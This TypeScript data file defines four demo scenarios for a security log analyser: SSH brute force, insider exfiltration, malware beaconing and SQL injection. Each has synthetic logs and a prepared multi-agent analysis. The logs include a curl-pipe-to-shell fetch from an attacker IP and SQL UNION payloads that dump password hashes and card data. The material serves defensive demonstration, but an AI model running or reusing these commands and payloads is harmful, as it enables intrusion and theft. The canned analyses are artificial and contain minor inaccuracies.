export interface DemoLogPreset {
  id: string;
  name: string;
  category: string;
  icon: string;
  description: string;
  logText: string;
  // Prepared simulation data when offline or for fast instant demo mode
  simulatedResponse: any;
}

export const DEMO_PRESETS: DemoLogPreset[] = [
  {
    id: "brute-force",
    name: "SSH Brute Force Attack",
    category: "Credential Abuse",
    icon: "KeyRound",
    description: "Repeated connection attempts to Port 22 on staging web-server from external IP, followed by escalation.",
    logText: `2026-06-12 04:01:10 SEC-FIREWALL: Blocked inbound TCP from 198.51.100.42 to 10.0.4.15:22 (Limit exceeded)
2026-06-12 04:01:15 SEC-AUTH: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.42  user=root
2026-06-12 04:01:18 SEC-AUTH: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.42  user=admin
2026-06-12 04:01:21 SEC-AUTH: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.42  user=ubuntu
2026-06-12 04:01:25 SEC-AUTH: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.42  user=oracle
2026-06-12 04:01:28 SEC-AUTH: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.42  user=postgres
2026-06-12 04:01:35 SEC-AUTH: pam_unix(sshd:session): session opened for user root by (uid=0)
2026-06-12 04:01:40 SEC-SHELL: ROOT ACCESS GRANTED via sshd to root@10.0.4.15 from 198.51.100.42
2026-06-12 04:01:42 SEC-AUDIT: root executed 'curl -s http://198.51.100.42/setup.sh | sh'`,
    simulatedResponse: {
      classification: "Brute Force Attack",
      severity: "Critical",
      confidenceScore: 98,
      riskScore: 95,
      summary: "An external attacker from IP 198.51.100.42 successfully breached the system by conducting an SSH brute-force credential attack, subsequently obtaining root terminal access and downloading a malicious shell script setup.sh.",
      riskFactors: [
        "Multiple failed login attempts within a 30-second window",
        "Targeting common admin usernames (root, admin, guest, postgres)",
        "Insecure open public-facing Port 22 configuration",
        "Successful root session creation right after failing multiple times",
        "Outbound network execution of an unverified remote setup script via curl"
      ],
      affectedAssets: ["10.0.4.15 (Staging Web Server)", "Core OS PAM Module (pam_unix)"],
      timeline: [
        { time: "04:01:10", event: "Firewall registers burst of inbound requests on Port 22", status: "info" },
        { time: "04:01:15", event: "Authentication failure logged for root user", status: "flag" },
        { time: "04:01:28", event: "Successive authentication failure logged for users: admin, ubuntu, postgres", status: "flag" },
        { time: "04:01:35", event: "SSH Session established successfully for user root", status: "flag" },
        { time: "04:01:42", event: "High-privilege shell curl instruction executes remote setup script", status: "remediation" }
      ],
      mitigations: [
        "Enable Fail2Ban immediately on public hosts with strict login jail timings.",
        "Disable general SSH Password Authentication. Enforce SSH key-only policies.",
        "Change the default Port 22 to a non-standard alternate interface port.",
        "Isolate staging hosts inside a private subnet; restrict SSH to recognized VPN pools."
      ],
      responseChecklist: [
        { task: "Terminate the active rogue SSH session for user root from shell", completed: true },
        { task: "Add local iptables rule to temporarily block IP 198.51.100.42", completed: true },
        { task: "Inspect backup snapshots for host 10.0.4.15 to isolate file adjustments", completed: false },
        { task: "Enforce SSH key restriction and audit root credentials across VPC", completed: false }
      ],
      analystNotes: "This represents a classic automated credential hammering run. The attacker hit consecutive accounts until exploiting weak credentials on the root user. Action required immediately to inspect if setup.sh persistence actions completed.",
      agentExplanations: {
        "log-detective": {
          title: "🕵 Log Detective",
          explanation: "Analyzed authentication log metrics. Detected rapid-fire authentication errors (pam_unix) from 198.51.100.42 targeting multiple high-privilege usernames within seconds. Identified anomaly in temporal delay between failure block and successful root login.",
          evidence: ["Inbound port 22 limit exceeded alert", "5 distinct high-privilege authentication failures", "Sudden 'session opened for user root' success log"]
        },
        "threat-hunter": {
          title: "🏹 Threat Hunter",
          explanation: "Correlated credential fail-sequences with MITRE ATT&CK patterns. Classified attack vector as Brute Force Credential Hammering (T1110) followed by Command Injection and Remote Payload execution (T1059).",
          evidence: ["SSH port-scan spikes", "Escalation to interactive root terminal", "Remote curl download of external script file"]
        },
        "risk-judge": {
          title: "⚖ Risk Judge",
          explanation: "Assessed severity as CRITICAL. Immediate compromise of root user context bypasses normal defenses. Confidence is near absolute (98%) given that firewall bans, successive ssh failures, and final session success trace back to the same remote network routing node.",
          evidence: ["Root privilege escalation confirmed", "Unauthorized script execution with UID 0", "Evidence of automated scan tool signatures"]
        },
        "report-wizard": {
          title: "🧙 Report Wizard",
          explanation: "Generated structural executive timeline and prioritized impacted assets checklist. Drafted structured overview suitable for CISO alerting, containing temporal escalation graphs and log indicators of compromise.",
          evidence: ["Correlated 9 separate security lines into a clean timeline schema", "Organized audit path log metrics"]
        },
        "defense-advisor": {
          title: "🛡 Defense Advisor",
          explanation: "Compiled targeted short-term container network containment blocks alongside long-term identity & access management hardening configurations.",
          evidence: ["Drafted concrete mitigation scripts containing target block rules", "Formulated IAM keys migration strategy guidelines"]
        }
      }
    }
  },
  {
    id: "insider-threat",
    name: "Privileged Insider Exfiltration",
    category: "Insider Threat",
    icon: "ShieldAlert",
    description: "An employee accessing files out of typical working hours, copying folders, and compressing backup archives.",
    logText: `2026-06-12 01:15:22 DIR-LDAP: User 'dev_manager_sarah' logged in from custom off-hours home proxy (99.88.77.66)
2026-06-12 01:18:40 DFS-SHARE: Access to secure folder '\\\\prod-storage\\financials\\2026_q3_forecast' granted to dev_manager_sarah
2026-06-12 01:21:05 DFS-SHARE: Mass file read detected (142 files, 1.2 GB, pdf/xlsx formats)
2026-06-12 01:24:12 HOST-AGENT-MAC: User sarah executed local terminal command: 'zip -r /tmp/archive.zip ~/Downloads/forecast_2026/*'
2026-06-12 01:28:30 NET-PROXY: Outbound HTTPS post of size 1.25 GB from 10.0.12.80 to https://megaupload.biz/upload/api
2026-06-12 01:31:00 SEC-ALARM: Sarah has formally submitted an HR letter of resignation effective in 2 weeks.`,
    simulatedResponse: {
      classification: "Insider Threat / Data Exfiltration",
      severity: "High",
      confidenceScore: 92,
      riskScore: 88,
      summary: "A privileged employee ('dev_manager_sarah') accessed financial staging assets at 01:15 AM from an unusual subnet proxy, downloaded critical business strategy forecasts, compressed them locally, and transfered the aggregate Archive out of system parameters before resignation.",
      riskFactors: [
        "Unusual activity times (01:15 AM off-hours privilege session)",
        "Massive single-session file exports (142 highly confidential metrics, 1.2 GB)",
        "Compressing file chunks into silent system repositories (/tmp/archive.zip)",
        "Outbound transfer to high-risk document storage websites (megaupload.biz)",
        "Concurrent corporate resignation HR status flags active"
      ],
      affectedAssets: ["Active Directory User: dev_manager_sarah", "DFS production storage servers", "Corporate Finance Shares"],
      timeline: [
        { time: "01:15:22", event: "SARAH authenticates from residential proxy IP block", status: "info" },
        { time: "01:18:40", event: "Granted access block to secured quarterly financials folder", status: "info" },
        { time: "01:21:05", event: "Mass read registered: 142 discrete spreadsheets extracted", status: "flag" },
        { time: "01:24:12", event: "Terminal logs trace ZIP payload packaging on workspace station", status: "flag" },
        { time: "01:28:30", event: "Megaupload.biz egress upload connection finishes transferring 1.25GB", status: "remediation" }
      ],
      mitigations: [
        "Revoke Sarah's active session security states and place LDAP user account on emergency hold.",
        "Deploy strict outbound URL proxy bans on file-sharing and generic document lockers across subnet.",
        "Implement Data Loss Prevention (DLP) agents to block file zip packaging containing tagged files."
      ],
      responseChecklist: [
        { task: "Suspend dev_manager_sarah AD credential state", completed: true },
        { task: "Revoke active token sets on corporate mail and workspace applications", completed: true },
        { task: "Inspect local MacBook forensic host images", completed: false },
        { task: "Alert HR, legal risk teams, and technical leadership of the transfer", completed: false }
      ],
      analystNotes: "Sarah is a formal employee, making this highly sensitive. The telemetry strongly signals intentional theft of confidential forecast blueprints. Keep documentation ready for compliance review.",
      agentExplanations: {
        "log-detective": {
          title: "🕵 Log Detective",
          explanation: "Identified anomalous directory permission maps. The LDAP auth triggers off-hours flags. Local Mac console logs trace the creation of a zipped output package matches size profile of extracted corporate financial files.",
          evidence: ["LDAP login outside hours", "1.2 GB mass filesystem reads", "terminal command correlation for zip operations"]
        },
        "threat-hunter": {
          title: "🏹 Threat Hunter",
          explanation: "Categorized under MITRE ATT&CK: Exfiltration Over Web Service (T1567) matched with Archive Collected Data (T1560) using legitimate service accounts (T1078).",
          evidence: ["Financial directory security hits", "Command arguments compression syntax", "Foreign proxy routing metrics"]
        },
        "risk-judge": {
          title: "⚖ Risk Judge",
          explanation: "Assigned high severity. Confidence score (92%) bolstered by the extreme timeline synchronization with impending departure HR flags.",
          evidence: ["Departure announcement correlation", "100x variance compared to daily sarah read patterns"]
        },
        "report-wizard": {
          title: "🧙 Report Wizard",
          explanation: "Structured chronological event reports mapped directly against local OS process graphs and egress proxy byte records.",
          evidence: ["Generated timeline aligning network logs, file logs, and HR state"]
        },
        "defense-advisor": {
          title: "🛡 Defense Advisor",
          explanation: "Constructed strict least-privilege review rules and drafted local browser lock policies on external cloud lockers.",
          evidence: ["Created DLP payload policy files", "Formulated legal security preservation briefing"]
        }
      }
    }
  },
  {
    id: "malware-activity",
    name: "Malicious Executable & Beaconing",
    category: "Malware Activity",
    icon: "Bug",
    description: "Suspicious DLL or binary running from user folder executing periodic beaconing requests to an offshore dynamic DNS provider.",
    logText: `2026-06-12 02:44:11 ENDPOINT-AV: Process launched: C:\\Users\\Public\\update_helper.exe (MD5: 9f8a3d72b1e604f3299a9a3b90623aef)
2026-06-12 02:44:15 SEC-SYSMON: Process update_helper.exe injected thread into explorer.exe (PID: 3410)
2026-06-12 02:45:00 NET-DNS: Resolved dynamic host 'c2.botnet-master.su' for client 10.0.8.23
2026-06-12 02:45:01 SEC-BEACON: Outbound HTTPS POST to 185.112.4.99:443 (Size: 240 bytes, User-Agent: CustomBacon/1.0)
2026-06-12 02:46:01 SEC-BEACON: Outbound HTTPS POST to 185.112.4.99:443 (Size: 240 bytes, User-Agent: CustomBacon/1.0)
2026-06-12 02:47:01 SEC-BEACON: Outbound HTTPS POST to 185.112.4.99:443 (Size: 240 bytes, User-Agent: CustomBacon/1.0)
2026-06-12 02:47:15 SEC-REGISTRY: Registry autorun added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SafeUpdate -> C:\\Users\\Public\\update_helper.exe`,
    simulatedResponse: {
      classification: "Malware Infection & Dynamic Beaconing C2",
      severity: "High",
      confidenceScore: 95,
      riskScore: 90,
      summary: "A workstation has been infected by a stealth Trojan program operating out of C:\\Users\\Public. The file update_helper.exe injected code into explorer.exe (process hollow) and initiates periodic, repeating TCP beacon handshakes to a dynamic DNS host (185.112.4.99) on a 60-second timer.",
      riskFactors: [
        "Executable executing from non-standard system write directory (/Public)",
        "Process injection behavior (Hollowing helper threads into explorer.exe)",
        "Highly anomalous Dynamic DNS lookups (.su top level domains)",
        "Perfect 60-second periodic heartbeat beaconing signature",
        "Modifying persistence keys inside CurrentVersion\\Run registry registries"
      ],
      affectedAssets: ["10.0.8.23 (Windows Core workstation - Sales Group)", "System registry node 'SafeUpdate'"],
      timeline: [
        { time: "02:44:11", event: "AV log notes update_helper.exe runs from C:\\Users\\Public", status: "info" },
        { time: "02:44:15", event: "Sysmon logs process-injection thread target (explorer.exe)", status: "flag" },
        { time: "02:45:00", event: "First beacon resolved to offshore Dynamic DNS master server", status: "flag" },
        { time: "02:46:01", event: "Successive periodic 60s heartbeats detected to 185.112.4.99", status: "flag" },
        { time: "02:47:15", event: "Registry run key established to guarantee persistent activation on boot", status: "remediation" }
      ],
      mitigations: [
        "Isolate workstation 10.0.8.23 immediately from the local router subnet.",
        "Add bad IP network scope (185.112.4.99) to general firewall block-list profiles.",
        "Deploy active antivirus scanning remediation to scrub registry references and process trees."
      ],
      responseChecklist: [
        { task: "Isolate client host 10.0.8.23 from local domain directories", completed: true },
        { task: "Add C2 controller IP (185.112.4.99) to network egress blacklist", completed: true },
        { task: "Kill explorer.exe target threads and delete update_helper.exe file code", completed: false },
        { task: "Scan sibling workstations globally for identical file system MD5 signatures", completed: false }
      ],
      analystNotes: "This matches an active CobaltStrike or customized malicious malware client frame. The 60-second ping confirms automated remote Control and Commander loops. The persistence key demonstrates intent to persist long-term.",
      agentExplanations: {
        "log-detective": {
          title: "🕵 Log Detective",
          explanation: "Analyzed native AV alerts and dynamic process activity logs. Extracted custom suspicious MD5 and detected anomalous thread mapping activities inside target Windows UI instances.",
          evidence: ["update_helper.exe launch metadata", "explorer.exe registry monitoring intercept alerts"]
        },
        "threat-hunter": {
          title: "🏹 Threat Hunter",
          explanation: "Classified as Trojan Payload Execution with Command and Control periodic signaling (T1071 / Web Protocols). Identified persistence lock (T1547.001 - Registry Run Keys).",
          evidence: ["Atypical URL structure", "Structured autorun script injection registry logs"]
        },
        "risk-judge": {
          title: "⚖ Risk Judge",
          explanation: "Assessed highly dangerous. Dynamic beacon logs represent a live link allowing attackers to inject secondary payloads (ransomware or rootkits) at will. Severity assigned HIGH with 95% certainty.",
          evidence: ["Consistent 60-second delta timing pattern", "Process Thread Injection validation metrics"]
        },
        "report-wizard": {
          title: "🧙 Report Wizard",
          explanation: "Summarized Trojan attributes and highlighted exact registry key anchors. Integrated network destination indices.",
          evidence: ["Synthesized forensic MD5 and registry paths into standard documentation format"]
        },
        "defense-advisor": {
          title: "🛡 Defense Advisor",
          explanation: "Assembled prompt system lockdown recipes containing PowerShell cleanup scripts to wipe malicious Registry runs.",
          evidence: ["PowerShell persistence purge commands", "VPC routing isolate guidelines"]
        }
      }
    }
  },
  {
    id: "web-attack",
    name: "SQL Injection & Database Exfiltration",
    category: "SQL Injection",
    icon: "FileCode",
    description: "Continuous HTTP GET errors containing SQL query escape characters targeting billing portals, resulting in DB dump.",
    logText: `2026-06-12 03:10:05 SEC-WAF: Suspicious URL parameter decoded: /billing/invoice?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users
2026-06-12 03:10:08 SEC-WAF: Allowed client proxy (142.250.200.12) to bypass warning rules (Mode: Alert-only)
2026-06-12 03:10:15 DB-SERVER: Query Log: 'SELECT * FROM invoices WHERE id = 1 UNION SELECT username, password_hash FROM users'
2026-06-12 03:10:16 DB-SERVER: SQL command executed successfully. Returned 48,201 rows of database metadata.
2026-06-12 03:10:18 WEB-SERVER: Outbound response generated with content size: 14.8 MB (Content-Type: application/json)
2026-06-12 03:10:30 SEC-WAF: Subsequent POST /billing/invoice?id=1%20UNION%20SELECT%20cc_num,cvv%20FROM%20payments`,
    simulatedResponse: {
      classification: "SQL Injection & Database Exfiltration",
      severity: "Critical",
      confidenceScore: 97,
      riskScore: 96,
      summary: "A SQL Injection vulnerability in the billing invoice endpoint was successfully exploited by client IP 142.250.200.12. The attacker bypassed default Web Application Firewall (WAF) warning rules and dumped over 48,000 corporate account credentials, followed by an immediate attack aiming at credit card data caches.",
      riskFactors: [
        "Insecure WAF policy setting (Alert-only mode active)",
        "Exploiting unescaped input parameter using complex SQL UNION directives",
        "Bypassing application business query parameters directly to database logs",
        "Large HTTP client download payloads containing 48,201 private credential hash records",
        "Immediate pivot to high-value credit card repository components"
      ],
      affectedAssets: ["Production SQL Database (Invoices/Users schema)", "Web Application Billing Server", "F5/WAF Perimeter Firewall"],
      timeline: [
        { time: "03:10:05", event: "Web Application Firewall registers URL decode anomaly string", status: "info" },
        { time: "03:10:08", event: "WAF logs warn but allows execution due to permissive testing alert policies", status: "info" },
        { time: "03:10:15", event: "Raw SQL query compiles UNION statement targeting user table logs", status: "flag" },
        { time: "03:10:16", event: "Database successfully executes and releases substantial data array records", status: "flag" },
        { time: "03:10:30", event: "Attacker attempts follow-up UNION query for credit card payment fields", status: "remediation" }
      ],
      mitigations: [
        "Deploy parameterized queries / prepared statements immediately inside the Billing API code.",
        "Change Web Application Firewall configuration from 'Alert-only' monitor mode to 'Active Blocking'.",
        "Initiate emergency credential resets across all 48,000 compromised entries."
      ],
      responseChecklist: [
        { task: "Switch WAF configuration to 'BLOCKING' for active payload types", completed: true },
        { task: "Block IP 142.250.200.12 at security group edge router filters", completed: true },
        { task: "Enforce dynamic emergency credential resets for accounts database", completed: false },
        { task: "Rewrite SQL raw queries using parameter binding frameworks", completed: false }
      ],
      analystNotes: "Extremely serious vector of exploitation. The database exposed the target table index and permitted downloading of plaintext password hashes. Urgent deployment of prepared SQL structures required.",
      agentExplanations: {
        "log-detective": {
          title: "🕵 Log Detective",
          explanation: "Flagged URL manipulation indices in WAF logs. Correlated HTTP proxy response sizes (14.8MB) with direct database command successes, mapping client execution metrics.",
          evidence: ["SQL key terms in URL requests", "Database SQL query log audit trails", "Web server egress payload size logs"]
        },
        "threat-hunter": {
          title: "🏹 Threat Hunter",
          explanation: "Identified OWASP Top 10 Attack Vector: SQL Injection (T1190) coupled with Database Records Extraction (T1567).",
          evidence: ["UNION SELECT escape syntax", "Unauthorized access requests to Users table structures"]
        },
        "risk-judge": {
          title: "⚖ Risk Judge",
          explanation: "Identified Critical Severity. Compromising entire user databases can lead to credential stuffing runs across other corporate directories. Confidence absolute (97%).",
          evidence: ["Verified query success message", "Substantial outbound JSON package payload metadata"]
        },
        "report-wizard": {
          title: "🧙 Report Wizard",
          explanation: "Assembled structured details describing vulnerable endpoint code paths and cataloged compromised database fields.",
          evidence: ["Summarized exfiltrated table attributes and user metadata metrics"]
        },
        "defense-advisor": {
          title: "🛡 Defense Advisor",
          explanation: "Supplied customized code rewrite instructions in Node.js to replace vulnerable RAW queries with secure prepared statements.",
          evidence: ["Prepared Statement SQL examples", "WAF rules override guidelines"]
        }
      }
    }
  }
];
